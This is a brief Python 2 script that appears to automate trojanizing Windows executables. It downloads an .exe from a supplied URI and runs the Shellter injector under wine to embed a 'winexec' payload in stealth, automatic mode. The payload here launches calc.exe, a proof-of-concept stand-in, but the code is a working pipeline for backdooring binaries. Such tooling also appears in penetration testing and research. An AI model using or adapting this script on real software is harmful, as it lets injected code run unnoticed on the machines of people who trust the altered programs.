#!/usr/bin/env python

import sys
import os
import urllib2
import string
import random
import subprocess
from utils import *

def fgenerator(size=6, chars=string.ascii_uppercase + string.digits):
	return ''.join(random.choice(chars) for _ in range(size))

def downloadExe(uri):
	print text("[Shellter] Downloading file: %s" % uri)
	tmpname = fgenerator()
	f = urllib2.urlopen(uri)
	filepath = "tmp/%s.exe" %tmpname
	with open(filepath, "wb") as code:
		code.write(f.read())
	print text("[Shellter] Written file: %s" % filepath)
	return filepath

def shellterExe(exe):
	subprocess.call(["wine", "shellter/shellter.exe", "-f", exe, "-p", "winexec", "--cmd", "calc.exe", "-a", "-s"]) 
	return exe
